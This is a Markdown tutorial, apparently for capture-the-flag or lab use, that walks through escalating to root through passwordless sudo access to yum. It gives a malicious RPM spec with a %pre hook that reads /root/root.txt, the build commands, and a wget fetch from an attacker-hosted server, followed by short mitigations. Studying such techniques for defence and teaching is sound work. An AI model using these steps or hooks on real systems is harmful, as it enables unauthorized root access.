
# Linux Privilege Escalation via yum package manager

## Description
The `yum` package manager is a tool for installing, updating, and managing software packages in Linux distributions, particularly those based on Red Hat (e.g., CentOS, Fedora). It is often used with elevated privileges (`sudo`) to manage system-wide packages.

If a user has `sudo` permissions to run `yum` without a password (as seen in `sudo -l`), it can be exploited to escalate privileges and read sensitive files, such as `/root/root.txt`.

---

## Exploitation Steps

### Prerequisite: sudo access to `yum`
Check if the user has permission to run `yum` as root:
```bash
sudo -l
```

If you see something like:
```
User <username> may run the following commands on <hostname>:
    (ALL) NOPASSWD: /usr/bin/yum
```

You can proceed with this privilege escalation.

---

### Steps to Exploit

#### On the Attacker's Machine
1. **Create the malicious SPEC file**  
   Save the following as `malicious.spec`:
   ```spec
   Name: malicious
   Version: 1.0
   Release: 1
   Summary: Malicious RPM for privilege escalation
   License: GPL
   BuildArch: noarch

   %description
   This RPM reads sensitive files.

   %pre
   cat /root/root.txt

   %files
   %doc

   %changelog
   * Wed Dec 08 2024 Your Name <youremail@example.com> - 1.0-1
   - RPM to read sensitive files
   ```

2. **Build the malicious RPM**
   Run the following commands to prepare and build the RPM package:
   ```bash
   mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}
   mv malicious.spec ~/rpmbuild/SPECS/
   rpmbuild -ba ~/rpmbuild/SPECS/malicious.spec
   ```

   The resulting RPM file will be located in `~/rpmbuild/RPMS/noarch/`.

3. **Host the RPM using Python HTTP server**
   Serve the malicious RPM over HTTP to make it accessible to the target:
   ```bash
   cd ~/rpmbuild/RPMS/noarch/
   python3 -m http.server 4444
   ```

#### On the Target Machine
1. **Download the malicious RPM**
   On the target machine, navigate to a writable directory like `/tmp` and download the RPM:
   ```bash
   cd /tmp
   wget http://<attacker-ip>:4444/malicious-1.0-1.noarch.rpm
   ```

2. **Install the malicious RPM**
   Use `sudo yum` to install the downloaded RPM:
   ```bash
   sudo yum localinstall malicious-1.0-1.noarch.rpm
   ```

3. **View the output**
   The content of `/root/root.txt` will be displayed on the terminal as a result of the `%pre` hook.

---

### Mitigation
- Restrict the use of `sudo yum` to trusted administrators.
- Use tools like `sudoers` to audit and limit commands.
- Regularly review and monitor system logs for unexpected `yum` operations.

---

### Disclaimer
This guide is for educational purposes only. Unauthorized use of this information may violate the law. Always ensure you have permission before attempting to exploit or test any system.
